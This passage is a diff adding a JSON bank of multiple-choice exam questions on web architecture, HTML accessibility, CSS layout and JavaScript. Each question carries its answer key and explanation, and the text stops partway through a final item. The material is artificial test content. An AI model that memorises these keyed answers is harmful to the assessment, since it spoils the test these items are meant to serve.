@@ -1,0 +1,2402 @@
+[
+ {
+  "unit": "2",
+  "slug": "U2-L01",
+  "sub": "Web architecture, client-server communication, HTTP/HTTPS, DNS and hosting",
+  "q": "An API endpoint has moved permanently to a new path. Clients POST JSON to the old path, and the server's redirect makes browsers re-issue the call as a GET with no body, so the write silently never happens. Which redirect status code should the server return so that clients repeat the request permanently at the new URL while keeping the POST method and the body?",
+  "opts": {
+   "A": "301 Moved Permanently",
+   "B": "303 See Other",
+   "C": "308 Permanent Redirect",
+   "D": "302 Found"
+  },
+  "ans": "C",
+  "exp": "308 is the only permanent redirect that forbids the user agent from changing the request method or dropping the body. 307 preserves the method too but signals a temporary move; 301 and 302 are the exact codes whose historical handling rewrites POST to GET, and 303 mandates that rewrite by definition.",
+  "conf": "high",
+  "id": "GEN-T2U2-001"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L01",
+  "sub": "Web architecture, client-server communication, HTTP/HTTPS, DNS and hosting",
+  "q": "A Python application is deployed behind Nginx acting as a reverse proxy on the same host. Its audit log, which records the requester's IP for every state-changing action, now shows 127.0.0.1 for every request. What is the correct fix?",
+  "opts": {
+   "A": "Have Nginx add the originating address in an X-Forwarded-For header and configure the application to read the client IP from that trusted header",
+   "B": "Add `proxy_set_header Host $host;` to the proxied location so the upstream sees the real hostname",
+   "C": "Disable `proxy_buffering` so Nginx streams the request straight through without rewriting it",
+   "D": "Bind the application to 0.0.0.0 instead of 127.0.0.1 so it receives connections directly"
+  },
+  "ans": "A",
+  "exp": "A reverse proxy terminates the client's TCP connection and opens its own to the upstream, so the upstream legitimately sees the proxy's address; the original address survives only if the proxy forwards it in a header such as X-Forwarded-For and the app is told to trust that header from the proxy. Setting the Host header is a real and often necessary directive, but Host carries the requested site name, not the client address.",
+  "conf": "high",
+  "id": "GEN-T2U2-002"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L01",
+  "sub": "Web architecture, client-server communication, HTTP/HTTPS, DNS and hosting",
+  "q": "Nginx proxies to an application server with `proxy_read_timeout 60s;`. A report-generation request takes about 90 seconds to complete. The upstream is up and accepts the connection, but the browser gets an error page at the one-minute mark. Which status does Nginx return?",
+  "opts": {
+   "A": "502 Bad Gateway",
+   "B": "504 Gateway Timeout",
+   "C": "503 Service Unavailable",
+   "D": "408 Request Timeout"
+  },
+  "ans": "B",
+  "exp": "When the upstream accepts the connection but sends nothing within proxy_read_timeout, Nginx gives up waiting and returns 504, the code reserved for a gateway that did not get a timely response from the server it depends on. 502 is what you would see if the upstream refused the connection or returned a malformed response, which is not the case here; 408 concerns a client that is slow to send its own request.",
+  "conf": "high",
+  "id": "GEN-T2U2-003"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L01",
+  "sub": "Web architecture, client-server communication, HTTP/HTTPS, DNS and hosting",
+  "q": "A department wants the bare domain `revenue.mizoram.in` to resolve to a cloud load balancer that is published only as a hostname, not as a fixed IP address. Adding a CNAME record at the zone apex is rejected. Why, and what is the standard remedy?",
+  "opts": {
+   "A": "CNAME records may not carry a TTL below 300 seconds; raise the TTL and the record will be accepted",
+   "B": "The apex may only hold records for subdomains; move the site to `www.revenue.mizoram.in` as the only possible option",
+   "C": "A DNAME record should be placed at the apex, since DNAME is the form of aliasing defined for a zone's own name",
+   "D": "A CNAME cannot coexist with other records at the same name, and the apex must hold SOA and NS records; DNS providers solve this with an ALIAS/ANAME-style record that resolves the target and answers with its A/AAAA addresses"
+  },
+  "ans": "D",
+  "exp": "DNS forbids a CNAME alongside any other record at the same owner name, and every zone apex necessarily carries SOA and NS records, so an apex CNAME is invalid by construction; providers work around it with a synthetic ALIAS/ANAME record (also marketed as CNAME flattening) that follows the target and returns address records instead. DNAME is the tempting wrong answer: it aliases everything *below* a name, not the name itself, so it does not answer a query for the apex.",
+  "conf": "high",
+  "id": "GEN-T2U2-004"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L01",
+  "sub": "Web architecture, client-server communication, HTTP/HTTPS, DNS and hosting",
+  "q": "An administrator wants a single free Let's Encrypt certificate covering `*.mizoram.in`, because new subdomains are created for departments without notice. Which challenge type must be used to obtain it?",
+  "opts": {
+   "A": "HTTP-01, by serving a token file under /.well-known/acme-challenge/ on each host",
+   "B": "DNS-01, by publishing the required TXT record under _acme-challenge in the zone",
+   "C": "TLS-ALPN-01, by presenting the validation certificate during the TLS handshake on port 443",
+   "D": "Any of the challenge types; wildcard issuance only requires that the account has already validated the base domain"
+  },
+  "ans": "B",
+  "exp": "Let's Encrypt issues wildcard certificates only against DNS-01 validation, because control of an individual web server proves nothing about the arbitrary subdomains a wildcard would cover, whereas writing a TXT record proves control of the zone itself. HTTP-01 is the everyday default for ordinary hostnames and is the most tempting choice here, but it is explicitly not accepted for wildcard names.",
+  "conf": "high",
+  "id": "GEN-T2U2-005"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L01",
+  "sub": "Web architecture, client-server communication, HTTP/HTTPS, DNS and hosting",
+  "q": "HTTP/2 already multiplexes many concurrent streams over one connection, yet on a lossy mobile link a single dropped packet still stalls every stream in flight. Which property of HTTP/3 addresses this?",
+  "opts": {
+   "A": "It runs over QUIC on UDP, where loss recovery is per-stream, so a lost packet delays only the stream whose data it carried",
+   "B": "It compresses headers, so fewer packets are sent and the chance of loss is correspondingly reduced",
+   "C": "It opens a separate TCP connection per stream, restoring the parallelism that HTTP/1.1 clients got from multiple connections",
+   "D": "It makes encryption mandatory, so retransmissions are handled inside the TLS record layer rather than by the transport"
+  },
+  "ans": "A",
+  "exp": "HTTP/2 removed head-of-line blocking at the application layer but still rides a single TCP connection, whose in-order delivery guarantee holds back every multiplexed stream until the missing segment is retransmitted; QUIC keeps streams independent at the transport layer, so only the affected stream waits. Header compression is real in both HTTP/2 (HPACK) and HTTP/3 (QPACK) but does nothing about ordering, and HTTP/3 uses fewer connections, not one per stream.",
+  "conf": "high",
+  "id": "GEN-T2U2-006"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L01",
+  "sub": "Web architecture, client-server communication, HTTP/HTTPS, DNS and hosting",
+  "q": "A site responds over HTTPS with `Strict-Transport-Security: max-age=31536000; includeSubDomains`. A user who visited the site yesterday now types `http://site.gov.in/login` into the same browser. What does a compliant browser do?",
+  "opts": {
+   "A": "Sends the plaintext HTTP request as typed, then follows the server's 301 redirect to the HTTPS URL",
+   "B": "Sends the request over HTTP but adds an Upgrade-Insecure-Requests header asking the server to switch",
+   "C": "Rewrites the URL to https:// internally and makes no cleartext request to the site at all",
+   "D": "Refuses to load the page and shows a certificate error until the user types the https:// form explicitly"
+  },
+  "ans": "C",
+  "exp": "While a host's HSTS policy is still within max-age, the browser upgrades any http:// URL for that host to https:// before opening a connection, which is precisely what removes the one cleartext round trip an on-path downgrade attack needs. Option A describes the pre-HSTS behaviour that a plain redirect gives you, and it is the tempting answer because the server usually still sends that redirect — the browser just never reaches it.",
+  "conf": "high",
+  "id": "GEN-T2U2-007"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L02",
+  "sub": "HTML, semantic elements, forms, multimedia, Canvas, SVG and accessibility",
+  "q": "A developer nests an <h1> inside a <section> that is itself inside another <section>, expecting assistive technology to announce it as a third-level heading. What actually happens in current browsers and screen readers?",
+  "opts": {
+   "A": "It is announced as a level 1 heading; the sectioning-based outline algorithm was never implemented by browsers and has been dropped from the HTML standard",
+   "B": "It is announced as a level 3 heading, matching the depth of <section> nesting",
+   "C": "It is announced as a level 2 heading, because a sectioning element demotes its heading by exactly one level however deeply it is nested",
+   "D": "It is announced as a heading of undefined level, leaving assistive technology to infer structure from document order"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "Heading level is taken from the tag name alone: <h1> is level 1 no matter how many sectioning ancestors wrap it, because the proposed document outline algorithm shipped in no engine and was removed from the spec. The level-3 option describes the behaviour the algorithm was supposed to produce, which is exactly why the myth persists; author the correct <h2>/<h3> explicitly.",
+  "id": "GEN-T2U2-008"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L02",
+  "sub": "HTML, semantic elements, forms, multimedia, Canvas, SVG and accessibility",
+  "q": "A page has a site-wide menu and a breadcrumb trail, each in its own <nav> element. A screen-reader user opening the landmarks list hears \"navigation\" twice with nothing to distinguish them. What is the correct fix?",
+  "opts": {
+   "A": "Give each <nav> a unique id, which assistive technology exposes as the landmark's accessible name",
+   "B": "Put aria-hidden=\"true\" on the breadcrumb <nav> so only one navigation landmark is announced",
+   "C": "Give each <nav> a distinct accessible name with aria-label or aria-labelledby",
+   "D": "Replace the breadcrumb <nav> with <div role=\"navigation\">, which does not create a duplicate landmark entry"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "Repeated landmarks of the same type are disambiguated by giving each one an accessible name, which for a <nav> comes from aria-label or aria-labelledby. The <div role=\"navigation\"> option changes nothing, since an explicit role and its native element expose the identical landmark; and aria-hidden would remove the breadcrumbs from the accessibility tree entirely rather than label them.",
+  "id": "GEN-T2U2-009"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L02",
+  "sub": "HTML, semantic elements, forms, multimedia, Canvas, SVG and accessibility",
+  "q": "A checkout form contains <input name=\"coupon\" value=\"FEST26\" disabled>. The user presses the submit button. What does the server receive for coupon?",
+  "opts": {
+   "A": "coupon=FEST26, because the value attribute is present regardless of the control's state",
+   "B": "Nothing at all — a disabled control is not successful, so no name/value pair is sent for it",
+   "C": "coupon= with an empty value",
+   "D": "Nothing, and the browser additionally blocks the submission with a constraint-validation error"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "Disabled controls are excluded from the form's entry list, so the key is simply absent from the payload — not present-and-empty, which is what readonly would give you (readonly controls are submitted with their value). Nothing about disabled participates in constraint validation either, so the submission itself proceeds normally.",
+  "id": "GEN-T2U2-010"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L02",
+  "sub": "HTML, semantic elements, forms, multimedia, Canvas, SVG and accessibility",
+  "q": "Five radio buttons ask the candidate to choose a preferred exam centre. Each <input> has its own correctly associated <label>, but a screen-reader user hears only the individual centre names and never the question itself. Which markup supplies the group's accessible name?",
+  "opts": {
+   "A": "Wrap the radios in a <fieldset> whose <legend> contains the question text",
+   "B": "Wrap all five inputs in one <label> element that also contains the question text",
+   "C": "Place an <h3> containing the question immediately before the radio buttons",
+   "D": "Put title=\"Preferred exam centre\" on the <div> that contains the radios"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "<fieldset> groups related controls and its <legend> becomes the group's accessible name, so each radio is announced together with the question. A preceding <h3> is the most tempting alternative because it looks right on screen, but a heading is not programmatically associated with the controls; and a plain <div> has no role, so a title on it exposes no name.",
+  "id": "GEN-T2U2-011"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L02",
+  "sub": "HTML, semantic elements, forms, multimedia, Canvas, SVG and accessibility",
+  "q": "A landing page uses <video src=\"promo.mp4\" autoplay> with an ordinary audio track. On desktop Chrome the video sits on its first frame and never starts; the only sign of trouble is a rejected play() promise. What explains this?",
+  "opts": {
+   "A": "The autoplay attribute has no effect unless preload=\"auto\" is also set",
+   "B": "A <video> element will not start automatically unless the controls attribute is present",
+   "C": "The src attribute is ignored on <video>; media must be supplied through child <source> elements",
+   "D": "Browser autoplay policy blocks unmuted autoplay without a user gesture; adding muted (with playsinline for mobile) lets it start"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "Chrome and the other major engines permit autoplay only when the media is muted or the user has already interacted with the origin, and a blocked attempt surfaces as a rejected play() promise exactly as described. The preload option is a red herring — preload governs buffering, not permission to play — and <video> accepts src directly, with <source> only needed for multiple formats.",
+  "id": "GEN-T2U2-012"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L02",
+  "sub": "HTML, semantic elements, forms, multimedia, Canvas, SVG and accessibility",
+  "q": "A recorded training video already ships a <track> with kind=\"subtitles\" carrying a translation of the dialogue. An accessibility audit still records a failure for deaf and hard-of-hearing users. Which track kind must be added?",
+  "opts": {
+   "A": "kind=\"descriptions\", which narrates what is happening on screen",
+   "B": "kind=\"captions\", which carries the dialogue plus speaker identification and relevant non-speech sound",
+   "C": "kind=\"chapters\", which exposes navigable sections of the timeline",
+   "D": "kind=\"metadata\", which carries cue data for scripts to consume"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "Subtitles assume the viewer can hear and only render the spoken words, whereas captions are written for a viewer who hears nothing and must therefore also convey speaker changes and meaningful non-speech audio. The descriptions option is a genuine track kind but solves the opposite problem — it serves blind users by narrating the visuals.",
+  "id": "GEN-T2U2-013"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L02",
+  "sub": "HTML, semantic elements, forms, multimedia, Canvas, SVG and accessibility",
+  "q": "An interactive seat-selection map is drawn entirely with the Canvas 2D API, and clicks are resolved from pointer coordinates against an internal seat array. Screen-reader users perceive nothing on the page. Which approach fixes this using the mechanism Canvas itself provides?",
+  "opts": {
+   "A": "Add an alt attribute to the <canvas> element describing the seating layout",
+   "B": "Set aria-live=\"polite\" on the <canvas> so each drawing operation is announced as it occurs",
+   "C": "Place focusable, labelled DOM elements — one per seat — inside the <canvas> element as its fallback content, and keep them in sync with what is drawn",
+   "D": "Supply a <noscript> block containing an accessible seat list"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "Child content of <canvas> is the spec's designated fallback and shadow DOM for the bitmap: it is exposed to assistive technology and can be focused and activated, so mirroring each seat as a real button gives keyboard and screen-reader access to the same interaction. aria-live is the seductive wrong answer — drawing to a canvas mutates a bitmap, not the DOM, so there is no mutation for a live region to announce, and <noscript> never renders for a screen-reader user with JavaScript enabled.",
+  "id": "GEN-T2U2-014"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L02",
+  "sub": "HTML, semantic elements, forms, multimedia, Canvas, SVG and accessibility",
+  "q": "An icon exists as an .svg file. The team needs it to take its fill from the page's currentColor and to change colour on hover through an ordinary CSS rule. This works when the <svg> markup is inlined in the page but not when it is referenced as <img src=\"icon.svg\">. Why?",
+  "opts": {
+   "A": "<img> rasterises the SVG at load time, discarding the vector paths that CSS would target",
+   "B": "SVG elements obey only presentation attributes such as fill; CSS declarations never apply to them",
+   "C": "currentColor is a CSS-only keyword with no meaning inside SVG, so only literal colour values work there",
+   "D": "An SVG loaded through <img> is an isolated document — the page's CSS and scripts cannot reach its elements, and inherited values such as currentColor do not cross that boundary"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "Referencing an SVG from <img> renders it as an independent, non-scriptable document, so page stylesheets never match its shapes and it has no parent from which to inherit currentColor; inlining puts the same shapes in the page's own DOM where both apply. The rasterisation option is wrong on its own terms — the image still scales as a vector, it is simply unreachable from outside.",
+  "id": "GEN-T2U2-015"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L02",
+  "sub": "HTML, semantic elements, forms, multimedia, Canvas, SVG and accessibility",
+  "q": "GIGW 3.0, the Guidelines for Indian Government Websites issued under MeitY, requires government websites and mobile apps to conform to WCAG 2.1 at which conformance level?",
+  "opts": {
+   "A": "Level A",
+   "B": "Level AA",
+   "C": "Level AAA",
+   "D": "WCAG 2.1 defines no conformance levels; GIGW substitutes its own percentage compliance score"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "GIGW 3.0 sets Level AA of WCAG 2.1 as the accessibility bar for Indian government web properties, matching the level used in public-procurement accessibility requirements internationally. Level AAA is not the answer anywhere — WCAG itself advises against requiring full AAA conformance for entire sites, since some AAA criteria cannot be met for all content types.",
+  "id": "GEN-T2U2-016"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L03",
+  "sub": "CSS, Flexbox, Grid and responsive web design",
+  "q": "A flex row contains an item holding a long unbroken log line. The item refuses to shrink and pushes the row wider than its container, even though flex-shrink is at its default of 1. Which declaration on that flex item resolves the overflow?",
+  "opts": {
+   "A": "flex-shrink: 2",
+   "B": "min-width: 0",
+   "C": "max-width: 100%",
+   "D": "flex-basis: 0"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "A flex item's initial min-width is auto, which floors its used width at its min-content size, so shrinking stops there; min-width: 0 removes that floor. flex-shrink: 2 changes nothing because the item is already being asked to shrink and is blocked by the automatic minimum, and max-width cannot help because the minimum size wins over the maximum when the two conflict.",
+  "id": "GEN-T2U2-017"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L03",
+  "sub": "CSS, Flexbox, Grid and responsive web design",
+  "q": "In a display: flex navigation row, the final link must sit hard against the right edge while the remaining links stay grouped at the left. No spacer element may be added and justify-content must stay at its default. Which declaration on the last item achieves this?",
+  "opts": {
+   "A": "align-self: flex-end",
+   "B": "justify-self: end",
+   "C": "margin-left: auto",
+   "D": "float: right"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "An auto margin on a flex item absorbs all free space on that side before justify-content is applied, so margin-left: auto pushes the item to the far end of the main axis. align-self only moves the item on the cross axis, justify-self is ignored in flex layout entirely, and float has no effect on a flex item because floating is blockified away during flex item creation.",
+  "id": "GEN-T2U2-018"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L03",
+  "sub": "CSS, Flexbox, Grid and responsive web design",
+  "q": "A CSS Grid gallery mixes single-column items with items that span two columns, and is declared grid-auto-flow: row dense. Compared with plain grid-auto-flow: row, what does the dense keyword change?",
+  "opts": {
+   "A": "It reduces the gap between tracks so items pack together with no leftover space",
+   "B": "It forces all auto-placed items onto one row, creating implicit columns as needed",
+   "C": "It makes every implicitly created row take the height of the tallest item in the grid",
+   "D": "It lets the placement algorithm go back and fill earlier holes with later items that fit, so visual order can diverge from DOM order"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "Sparse (default) placement never moves the cursor backwards, so a wide item that does not fit leaves a hole; dense placement revisits those holes with any later item small enough to fit, which is why it can reorder content visually and is an accessibility concern for keyboard and screen-reader order. Gap size is controlled by the gap property and is untouched by grid-auto-flow.",
+  "id": "GEN-T2U2-019"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L03",
+  "sub": "CSS, Flexbox, Grid and responsive web design",
+  "q": "A hero image must be a wide landscape crop on desktop and a genuinely different, tighter portrait crop on phones — two separate files, not two sizes of one file. Which approach lets the browser fetch only the crop it will actually display?",
+  "opts": {
+   "A": "A single <img> whose srcset lists both files with w descriptors and a matching sizes attribute",
+   "B": "A <picture> element with a <source media=\"(max-width: 600px)\"> pointing at the portrait crop and an <img> fallback carrying the landscape crop",
+   "C": "A single <img> whose srcset lists both files with x descriptors for 1x and 2x",
+   "D": "Two <img> elements, with the unwanted one hidden via display: none inside a media query"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "This is art direction rather than resolution switching: <picture> evaluates each <source> media condition in order and loads only the first match, so the crop is chosen deterministically by viewport. The srcset options are wrong because w and x descriptors are hints for resolution switching and the browser is free to pick either candidate regardless of viewport shape, and display: none does not reliably prevent an <img> from being fetched.",
+  "id": "GEN-T2U2-020"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L03",
+  "sub": "CSS, Flexbox, Grid and responsive web design",
+  "q": "A design system wraps its base selectors in :where(...) so that page-level CSS can override them without specificity fights. Compared with :is(...), what does :where() do differently?",
+  "opts": {
+   "A": ":where() always contributes zero specificity, while :is() takes the specificity of its most specific argument",
+   "B": ":where() matches only the first selector in its list, while :is() matches any of them",
+   "C": ":where() pierces shadow DOM boundaries, while :is() is confined to the current tree",
+   "D": ":where() may appear only at the start of a compound selector, while :is() may appear anywhere in it"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "The two pseudo-classes match identically; the sole difference is specificity, with :where() contributing nothing and :is() adopting the weight of its heaviest argument. That is exactly why a reset written as :where(.card) h2 is overridable by a later single-class rule, whereas :is(.card) h2 would still carry class-level weight.",
+  "id": "GEN-T2U2-021"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L03",
+  "sub": "CSS, Flexbox, Grid and responsive web design",
+  "q": "A card component appears both in a wide main column and in a narrow sidebar on the same page at the same viewport width, and must switch to its stacked layout only when it is in the sidebar. Which CSS mechanism expresses this?",
+  "opts": {
+   "A": "@media (max-width: 400px), because media query lengths resolve against the nearest block container",
+   "B": "@supports (inline-size: 400px), which tests the element's own box against the given size",
+   "C": "@container after declaring container-type: inline-size on the card's wrapper, because media queries only ever resolve against the viewport",
+   "D": "@media (min-width: 400px) placed in the sidebar's own stylesheet, since media queries are scoped to the stylesheet that declares them"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "Media queries have exactly one subject, the viewport (or print surface), so they cannot distinguish two instances of a component that share a viewport; container queries evaluate against a named ancestor that has opted in via container-type, making the component responsive to its own available inline size. @supports is a feature query that tests declaration support, not element dimensions.",
+  "id": "GEN-T2U2-022"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L03",
+  "sub": "CSS, Flexbox, Grid and responsive web design",
+  "q": "A section heading is styled position: sticky; top: 0 and the browser supports sticky positioning, yet the heading scrolls away with the content instead of pinning. What is the most likely cause?",
+  "opts": {
+   "A": "An ancestor of the heading has overflow set to hidden, auto or scroll, so the heading sticks within that ancestor's scrollport rather than within the page",
+   "B": "position: sticky requires an explicit height on the sticky element itself",
+   "C": "position: sticky requires the parent to be position: relative to establish a containing block",
+   "D": "top: 0 is ignored on a sticky element unless z-index is set to auto"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "A sticky element is positioned relative to its nearest scrolling ancestor, and any ancestor with a non-visible overflow value becomes that scroll container; if that container does not itself scroll, the element appears never to stick even though the CSS is valid. Option C is the familiar rule for position: absolute and does not apply here — sticky needs no positioned ancestor.",
+  "id": "GEN-T2U2-023"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L03",
+  "sub": "CSS, Flexbox, Grid and responsive web design",
+  "q": "A full-screen hero uses height: 100vh. On mobile browsers with a retracting URL bar the hero is taller than the visible area while the bar is shown. Which unit sizes the hero to the viewport as it currently is, growing and shrinking as the browser chrome retracts and returns?",
+  "opts": {
+   "A": "100svh",
+   "B": "100lvh",
+   "C": "100vmin",
+   "D": "100dvh"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "The dynamic viewport unit dvh tracks the viewport as browser chrome expands and collapses, which is precisely the behaviour asked for. svh and lvh are the tempting near-misses: both are stable values, svh assuming the chrome is always shown and lvh assuming it is always retracted, and lvh is what 100vh effectively resolves to on those browsers in the first place.",
+  "id": "GEN-T2U2-024"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L03",
+  "sub": "CSS, Flexbox, Grid and responsive web design",
+  "q": "A heading is declared font-size: clamp(1rem, 4vw, 2rem). The root font size is the default 16px and the viewport width resolves to 1200px. What computed font size results?",
+  "opts": {
+   "A": "16px",
+   "B": "24px",
+   "C": "32px",
+   "D": "48px"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "The preferred value 4vw evaluates to 48px at a 1200px viewport, which exceeds the maximum, so clamp() returns the maximum of 2rem = 32px. 48px is the trap for reading the middle argument as the result without applying the upper bound; note also that vw is a fraction of viewport width and is unaffected by the root font size.",
+  "id": "GEN-T2U2-025"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L04",
+  "sub": "JavaScript, the DOM, event handling, asynchronous programming, JSON and Fetch",
+  "q": "What is the return value of JSON.stringify([1, undefined, function () {}, 4]) ?",
+  "opts": {
+   "A": "'[1,4]'",
+   "B": "'[1,undefined,undefined,4]'",
+   "C": "'[1,null,null,4]'",
+   "D": "It throws a TypeError, because a function is not serialisable"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "When JSON.stringify meets undefined, a function or a symbol it omits the property if it is inside an object, but censors it to null inside an array, because an array element cannot simply vanish without shifting the indices. '[1,4]' is the behaviour you would get for object properties, not array elements, and nothing here throws.",
+  "id": "GEN-T2U2-026"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L04",
+  "sub": "JavaScript, the DOM, event handling, asynchronous programming, JSON and Fetch",
+  "q": "A page served from https://app.example.gov.in calls fetch('https://api.example.gov.in/profile'). The API already responds with Access-Control-Allow-Origin set to the exact app origin and Access-Control-Allow-Credentials: true, yet the browser still sends no session cookie. Which change to the fetch call is required?",
+  "opts": {
+   "A": "Add credentials: 'include' to the request options",
+   "B": "Add mode: 'cors' to the request options",
+   "C": "Add mode: 'no-cors' to the request options",
+   "D": "Attach the session cookie yourself through the headers option"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "fetch defaults to credentials: 'same-origin', so cookies are withheld on a cross-origin request until the caller opts in with 'include'; the server-side CORS headers are already in place here. mode: 'cors' is already the default for a cross-origin request and changes nothing, and Cookie is a forbidden header name that script cannot set.",
+  "id": "GEN-T2U2-027"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L04",
+  "sub": "JavaScript, the DOM, event handling, asynchronous programming, JSON and Fetch",
+  "q": "save() returns a Promise. What does this function do?\n\nasync function saveAll(items) {\n  items.forEach(async (item) => {\n    await save(item);\n  });\n  console.log('all saved');\n}",
+  "opts": {
+   "A": "Logs 'all saved' only after every save() has resolved",
+   "B": "Logs 'all saved' before any save() has resolved",
+   "C": "Throws a TypeError, because forEach does not accept an async callback",
+   "D": "Runs the saves strictly one after another, then logs 'all saved'"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "forEach discards whatever its callback returns, so the promise from each async callback is thrown away; each callback runs synchronously only as far as its first await, and then forEach returns and the log executes before any continuation resumes. Sequential execution (option D) is what for...of with await would give you; Promise.all(items.map(save)) gives the concurrent wait.",
+  "id": "GEN-T2U2-028"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L04",
+  "sub": "JavaScript, the DOM, event handling, asynchronous programming, JSON and Fetch",
+  "q": "A submit listener added to a form with addEventListener logs its message and calls event.stopPropagation(), but the browser still submits the form and reloads the page. Why?",
+  "opts": {
+   "A": "stopPropagation() takes effect only on listeners registered for the capture phase",
+   "B": "The listener must be registered with { passive: false } before cancellation can take effect",
+   "C": "The handler must return false; addEventListener treats a false return value as a cancellation",
+   "D": "stopPropagation() only halts further propagation of the event; suppressing the browser's default submit needs preventDefault()"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "Propagation and default action are two independent things: stopPropagation() keeps other listeners on ancestors from firing, while only preventDefault() cancels the navigation. Returning false cancels the default in inline handlers and in jQuery, but a return value from an addEventListener callback is ignored, and { passive: false } merely restores the ability to call preventDefault on scroll-blocking events such as touchstart and wheel.",
+  "id": "GEN-T2U2-029"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L04",
+  "sub": "JavaScript, the DOM, event handling, asynchronous programming, JSON and Fetch",
+  "q": "A dashboard issues six independent fetch calls and must render every panel whose call succeeded while marking the ones that failed, so a single rejection must not discard the other five results. Which promise combinator fits?",
+  "opts": {
+   "A": "Promise.all",
+   "B": "Promise.allSettled",
+   "C": "Promise.any",
+   "D": "Promise.race"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "Promise.allSettled waits for every input promise and resolves with an array of {status, value} or {status, reason} objects, which is exactly the successes-plus-failures shape needed. Promise.all short-circuits on the first rejection and throws the other results away, while Promise.any resolves with only the first fulfilment.",
+  "id": "GEN-T2U2-030"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L04",
+  "sub": "JavaScript, the DOM, event handling, asynchronous programming, JSON and Fetch",
+  "q": "Which statement correctly distinguishes an element's textContent from its innerText?",
+  "opts": {
+   "A": "textContent returns the text of every descendant node, including ones hidden by CSS, whereas innerText approximates the rendered text and leaves them out",
+   "B": "Assigning a string to textContent parses it as HTML, whereas assigning to innerText does not",
+   "C": "innerText is read-only, whereas textContent can be both read and written",
+   "D": "Reading textContent forces a layout reflow, whereas reading innerText does not"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "innerText is layout-aware, so it reflects what a user would actually see and skips subtrees hidden with display:none, while textContent walks the DOM and concatenates all text nodes regardless of styling. Option D is the truth reversed, since it is innerText that can trigger a reflow; neither property parses HTML on assignment, and both are writable.",
+  "id": "GEN-T2U2-031"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L04",
+  "sub": "JavaScript, the DOM, event handling, asynchronous programming, JSON and Fetch",
+  "q": "A type-ahead search box fires a fetch on every keystroke, and a stale response sometimes overwrites a newer one. The requirement is to actually cancel the earlier in-flight request when the next keystroke arrives. What does that?",
+  "opts": {
+   "A": "Call Promise.reject() inside the new keystroke handler to reject the earlier promise",
+   "B": "Call .cancel() on the promise object that the earlier fetch() returned",
+   "C": "Pass an AbortController's signal into fetch() and call controller.abort() on the next keystroke",
+   "D": "Set keepalive: false on the earlier request so the browser drops it"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "AbortController is the standard cancellation channel for fetch: the request aborts and its promise rejects with an AbortError DOMException you can filter out in the catch block. Promises have no .cancel() method and cannot be rejected from outside, and keepalive only controls whether a request may outlive the page.",
+  "id": "GEN-T2U2-032"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L04",
+  "sub": "JavaScript, the DOM, event handling, asynchronous programming, JSON and Fetch",
+  "q": "An external script tag inside <head> runs document.querySelector('#app') and gets null, although that element exists in the body markup. Without moving the tag or wrapping the code in a DOMContentLoaded listener, which attribute fixes it while still guaranteeing this script runs before another external script tag that follows it?",
+  "opts": {
+   "A": "async",
+   "B": "nomodule",
+   "C": "crossorigin=\"anonymous\"",
+   "D": "defer"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "defer downloads the script in parallel but delays execution until the document has been parsed, and deferred scripts run in document order, so both requirements are met. async also defers download but executes as soon as the file arrives, which may be before parsing finishes and in an order that depends on network timing.",
+  "id": "GEN-T2U2-033"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L04",
+  "sub": "JavaScript, the DOM, event handling, asynchronous programming, JSON and Fetch",
